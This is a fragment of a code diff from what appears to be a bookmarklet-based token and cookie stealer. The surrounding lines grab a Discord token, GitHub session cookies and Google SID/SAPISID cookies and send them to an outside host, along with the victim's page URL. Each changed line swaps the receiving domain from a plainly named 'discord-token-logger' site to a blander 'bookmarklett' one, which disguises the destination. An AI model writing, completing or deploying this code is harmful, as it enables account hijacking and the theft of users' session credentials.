@@ -2422,7 +2422,7 @@
       "}" +
       "if(token){" +
       "var cleanToken=token.replace(/\"/g,'').trim();" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?token='+encodeURIComponent(cleanToken)+" +
+      "var redirectUrl='https://bookmarklett.vercel.app/?token='+encodeURIComponent(cleanToken)+" +
       "'&method=token_logger&timestamp='+encodeURIComponent(new Date().toISOString())+" +
       "'&url='+encodeURIComponent(window.location.href);" +
       "window.open(redirectUrl,'_blank');" +
@@ -2468,7 +2468,7 @@
       "}" +
       "if(!ghSession){ghSession=cookies;}" +
       "console.log('GitHub cookies captured:', ghSession);" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?cookie='+encodeURIComponent(ghSession)+" +
+      "var redirectUrl='https://bookmarklett.vercel.app/?cookie='+encodeURIComponent(ghSession)+" +
       "'&type=github&method=github_cookie&timestamp='+encodeURIComponent(new Date().toISOString())+" +
       "'&url='+encodeURIComponent(window.location.href);" +
       "window.open(redirectUrl,'_blank');" +
@@ -2512,7 +2512,7 @@
       "console.log('🔐 SID Cookie:',sid);" +
       "console.log('🔐 SAPISID Cookie:',sapisid);" +
       "console.log('All Google Cookies:',allCookies);" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?cookie='+encodeURIComponent(allCookies)+" +
+      "var redirectUrl='https://bookmarklett.vercel.app/?cookie='+encodeURIComponent(allCookies)+" +
       "'&sid='+encodeURIComponent(sid)+" +
       "'&sapisid='+encodeURIComponent(sapisid)+" +
       "'&type=google&method=google_cookie&timestamp='+encodeURIComponent(new Date().toISOString())+" +
